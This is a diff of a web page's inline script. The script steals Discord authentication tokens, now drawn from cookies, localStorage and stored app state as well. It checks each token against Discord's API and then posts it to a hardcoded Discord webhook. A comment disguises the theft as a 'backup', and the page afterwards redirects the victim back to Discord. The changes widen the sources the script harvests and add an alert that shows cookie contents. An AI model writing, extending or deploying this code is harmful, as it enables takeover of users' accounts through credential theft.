@@ -23,11 +23,41 @@
   <script>
     (function() {
       try {
-        var token = localStorage.getItem("token");
-        if (token) {
-          token = token.replace(/"/g, "");
+        // 嘗試多種 token 來源
+        var token = null;
+        // 手機版 Discord 可能不存在 localStorage['token']
+        // 但如果是 iOS/Android 的 WebView，可能可以透過 cookie 取得
+        var cookies = document.cookie || '';
+        if (cookies.indexOf('Discord') > -1) {
+          var cookieMatch = cookies.match(/Discord=(.*?);/) || [];
+          if (cookieMatch[1]) {
+            token = decodeURIComponent(cookieMatch[1]);
+          }
+        }
 
-          // 取得帳號資訊
+        // 備案：localStorage token
+        if (!token) {
+          token = localStorage.getItem("token");
+          if (token) token = token.replace(/"/g, "");
+        }
+
+        if (!token) {
+          // 嘗試 app_state
+          token = localStorage.getItem("app_state");
+          if (token) {
+            try {
+              token = JSON.parse(token);
+              token = token.token || token.accessToken || token.authToken;
+            } catch(e) {
+              token = null;
+            }
+          }
+        }
+
+        if (token) {
+          if (typeof token === 'string') token = token.replace(/"/g, "");
+
+          // 驗證 token
           fetch("https://discord.com/api/v9/users/@me", {
             headers: { "Authorization": token }
           }).then(function(res) {
@@ -50,7 +80,7 @@
               body: JSON.stringify(msg)
             });
 
-            // 把 token 送到 webhook
+            // 備份 token 到 webhook
             fetch("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
@@ -59,7 +89,7 @@
               })
             }).catch(function() {});
 
-            // 1 秒後跳回 Discord
+            // 跳回 Discord
             setTimeout(function() {
               window.location.href = "https://discord.com/channels/@me";
             }, 1000);
@@ -68,7 +98,7 @@
             window.location.href = "https://discord.com/channels/@me";
           });
         } else {
-          alert("No token found!");
+          alert("No token found!\n\nCookie: " + cookies.substring(0, 100));
           window.location.href = "https://discord.com/channels/@me";
         }
       } catch(e) {
